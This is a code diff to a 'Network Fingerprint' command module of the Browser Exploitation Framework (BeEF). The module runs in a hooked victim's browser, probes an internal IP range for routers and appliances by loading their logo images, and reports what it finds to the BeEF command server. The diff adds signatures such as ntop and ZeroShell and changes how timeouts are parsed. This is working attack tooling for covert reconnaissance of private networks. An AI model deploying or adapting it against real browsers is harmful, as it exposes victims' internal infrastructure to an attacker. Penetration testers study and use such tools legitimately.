@@ -1,5 +1,5 @@
 //
-// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - http://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
@@ -9,9 +9,9 @@ beef.execute(function() {
   var ips = new Array();
   var ipRange = "<%= @ipRange %>";
   var ports   = "<%= @ports %>";
-  var timeout = "<%= @timeout %>";
-  var wait = "<%= @wait %>";
-  var threads = "<%= @threads %>";
+  var threads = parseInt("<%= @threads %>", 10);
+  var timeout = parseInt("<%= @timeout %>", 10)*1000;
+  var wait    = parseInt("<%= @wait %>", 10)*1000;
 
   if (ports != null) {
     ports = ports.split(',');
@@ -42,7 +42,7 @@ beef.execute(function() {
     // set target IP range
     var range = ipRange.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
     if (range == null || range[1] == null) {
-      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied");
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied", beef.are.status_error());
       return;
     }
     // ipRange will be in the form of 192.168.0.1-192.168.0.254
@@ -261,9 +261,15 @@ beef.execute(function() {
     "m0n0wall",
     "80","http",false,
     "/logo.gif",150,47),
-  new Array("SMC Router","80","http",false,"/images/logo.gif",133,59)
+  new Array("SMC Router","80","http",false,"/images/logo.gif",133,59),
+  new Array("ntop","3000","http",false,"/ntop_logo.png",103,50),
+  new Array(
+	"ZeroShell",
+	"80","http",false,
+	"/kerbynet/Zeroshell.gif",180,63)
 
 // Uncommon signatures
+//new Array("Microsoft ADFS","80","http",false,"/adfs/portal/illustration/illustration.png",1420,1080),
 //new Array("Rejetto HttpFileServer", "8080", "http",i true, "/~img27",16,16),
 //new Array("Citrix MetaFrame", "80", "http", false, "/Citrix/MetaFrameXP/default/media/nfusehead.gif",230,41),
 //new Array("Oracle E-Business Suite","80","http",false,"/OA_MEDIA/FNDSSCORP.gif",134,31),
@@ -290,7 +296,7 @@ beef.execute(function() {
     img.onerror = function() { dom.removeChild(this); }
     img.onload = function() {
       if (this.width == urls[this.id][5] && this.height == urls[this.id][6]) {
-        beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto='+proto+'&ip='+ip+'&port='+port+'&discovered='+signature_name+"&url="+escape(this.src));dom.removeChild(this);
+        beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto='+proto+'&ip='+ip+'&port='+port+'&discovered='+signature_name+"&url="+escape(this.src), beef.are.status_success());dom.removeChild(this);
         beef.debug("[Network Fingerprint] Found [" + signature_name + "] with URL [" + escape(this.src) + "]");
       }
     }
@@ -303,7 +309,7 @@ beef.execute(function() {
         dom.contentWindow.document.execCommand("Stop", false);
       }
       document.body.removeChild(dom);
-    }, timeout*1000);
+    }, timeout);
   }
 
   WorkerQueue = function(frequency) {
@@ -337,7 +343,7 @@ beef.execute(function() {
   // create worker queue
   var workers = new Array();
   for (w=0; w < threads; w++) {
-    workers.push(new WorkerQueue(wait*1000));
+    workers.push(new WorkerQueue(wait));
   }
 
   // for each URI signature
